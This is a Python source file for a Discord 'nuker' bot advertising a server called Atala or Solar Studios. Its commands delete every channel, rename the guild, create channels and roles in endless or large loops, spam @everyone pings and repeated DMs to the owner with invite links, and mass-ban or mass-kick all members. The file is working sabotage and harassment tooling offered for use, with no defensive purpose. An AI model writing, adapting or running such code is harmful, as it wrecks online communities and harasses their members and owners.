# imports
import discord
import os
from discord.ext import commands
from colorama import Fore
from flask import Flask
import os, signal
import sys
from keep_alive import keep_alive
client = commands.Bot(command_prefix="?",
                      intents=discord.Intents.all())  # client

# let us add some more commands!
client.remove_command("help")
token = os.getenv('TOKEN')
# events
@client.event
async def on_ready():
   print( ''' 

░██████╗░█████╗░██╗░░░░░░█████╗░██████╗░
██╔════╝██╔══██╗██║░░░░░██╔══██╗██╔══██╗
╚█████╗░██║░░██║██║░░░░░███████║██████╔╝
░╚═══██╗██║░░██║██║░░░░░██╔══██║██╔══██╗
██████╔╝╚█████╔╝███████╗██║░░██║██║░░██║
╚═════╝░░╚════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
 ''')
   await client.change_presence(activity=discord.Game(name="Atala"))



 
#main command
@client.command()
async def nuke(ctx):
  await ctx.message.delete()
  await ctx.guild.edit(name="Atala Nuked You | RIP")
  try:
    for channels in ctx.guild.channels:
      await channels.delete()
      print("deleted {}".format(channels))
  except:
    print("Cant delete {}".format(channels))

  while True:
    await ctx.guild.create_text_channel("fucked by atala")


# pings
@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send("@everyone Nuked By Atala | https://discord.gg/pUxSbJ983s")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(100):
    await ctx.guild.create_role(name="Nuked By Atala")


@client.command()
async def DmOwner(ctx):
  owner = ctx.guild.owner
  while True:
    await owner.send("Join Solar Studios https://discord.gg/pUxSbJ983s")


@client.command()
async def rename(ctx, *, newname):
  await ctx.message.delete()
  await ctx.guild.edit(name=newname)


@client.command()
async def massban(ctx):
  try:
    for members in ctx.guild.members:
      await members.ban(reason="Nuked By Atala https://discord.gg/RzDAW3yyRU")
      print(Fore.GREEN + f"banned {members}")
  except:
    print(Fore.RED + f"cant ban {members}")


@client.command()
async def kickall(ctx):
  try:
    for members in ctx.guild.members:
      await members.kick(reason="Nuked By Atala https://discord.gg/RzDAW3yyRU")
      print(Fore.GREEN + f"kicked {members}")
  except:
    print(Fore.RED + f"cant kick {members}")

keep_alive()
client.run(token)
